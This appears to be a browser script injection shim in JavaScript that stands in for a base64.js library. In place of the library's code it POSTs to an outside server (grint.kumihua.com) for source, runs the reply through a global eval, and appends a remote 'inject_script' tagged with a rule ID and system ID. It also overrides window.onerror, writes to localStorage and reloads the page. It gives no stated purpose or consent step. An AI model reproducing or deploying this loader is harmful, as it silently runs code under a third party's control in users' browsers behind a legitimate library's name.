var sourceScriptURI = 'http://www.bejson.com/static/bejson/enc/base64.js';
// RED POINT
(function() {
    //if (window.__COODAGLIFE__) return; //injected successfully
    var global = this;
    var evalGloble = eval;
    window.onerror = function(msg) {
        if (~msg.indexOf('invalid or illegal')) window.__COODAGSERUM__ = true;
        if (~msg.indexOf('find variable')) window.__COODAGSERUM__ = true;
        if (~msg.indexOf('is not defined')) window.__COODAGSERUM__ = true;
    };
    var _serum = function() {
        global.__COODAGLIFE__ = true;
        window.__COODAGSERUM__ = true;
        if (!sourceScripts[sourceScriptURI]) {
            return _eval(sourceScriptURI);
        }
        eval(sourceScripts[sourceScriptURI]);
        _loader(false, localStorage.COODAG_SERUM_IC);
    };
    var _loader = function(referenceEle, uri) {
        var s = document.createElement('script');
        s.src = uri;
        s.type = 'text/javascript';
        s.charset = 'utf-8';
        s.async = 'true';
        //referenceEle ? referenceEle.parentNode.insertBefore(s, referenceEle.nextSibling) : document.body.appendChild(s);
        document.body.appendChild(s);
    };
    var _eval = function(uri) {
        var xhr = new XMLHttpRequest();
        var url = "http://grint.kumihua.com/grint_server/web_inject/src_script/"+ruleID + "/";
        xhr.open('POST', url, false);
        //xhr.setRequestHeader('Content-Type', 'application/json');
        //xhr.timeout = 100;
        //xhr.ontimeout = function(){alert("TIME OUT!");};
        xhr.send(JSON.stringify({
            path: uri
        }));
        if (window.__COODAGSERUM__) {   //maybe exception handled below
            sourceScripts[sourceScriptURI] = xhr.responseText;
            localStorage.COODAG_SERUM_ON = true;
            localStorage.COODAG_SERUM_SC = JSON.stringify(sourceScripts);
            return location.reload();
        }
        try {
            evalGloble(xhr.responseText);
            localStorage.clear();
        } catch(error) {
            console && console.log('<CMS:ERROR:SOURCE_SCRIPT_CANNOT_GET>');
        }
    };
    var _getCurrentScript = function(sourceScriptURI) {
        if (document.currentScript) {
            return document.currentScript;
        } else {
            var scripts = document.getElementsByTagName('script');
            for (var i = 0; i < scripts.length; ++i) {
                if (scripts[i].src == sourceScriptURI) return scripts[i];
            }
        }
    };
    var _inject = function() {
        //_eval(sourceScriptURI + '?&' + ruleID);
        _eval(sourceScriptURI);
        //_loader(currentScript, injectionScriptURI + '?&' + ruleID);
        _looper = setInterval(_loop, 50);
    };
    var _looper, injection;
    var _loop = function() {
        switch (document.readyState) {
            case 'loading':
                break;
            case 'interactive':
            case 'complete':
                clearInterval(_looper);
                if (global.__COODAGLIFE__ === undefined) {
                    _loader(currentScript, injectionScriptURI + ruleID + "/?systemid=" + systemID);
                    localStorage.COODAG_SERUM_IC = injectionScriptURI + ruleID;
                    global.__COODAGLIFE__ = true;
                }
                //_inject();
                break;
            default:
                clearInterval(_looper);
                break;
        }
    };
    var ruleID = 'a99e66129c4057d9ba5964a66a9361a2';
    var systemID = '63054D43-7C33-42BD-9DC5-9C8F691E10B8-HBNYDX     ';
    var injectionScriptURI = "http://grint.kumihua.com/grint_server/web_inject/inject_script/";
    var sourceScripts = localStorage.COODAG_SERUM_SC ? JSON.parse(localStorage.COODAG_SERUM_SC) : {};
    var currentScript = _getCurrentScript(sourceScriptURI);
    //localStorage.COODAG_SERUM_ON ? _serum() : _looper = setInterval(_loop, 50);
    //_looper = setInterval(_loop, 50);
    injection = _inject();
})();





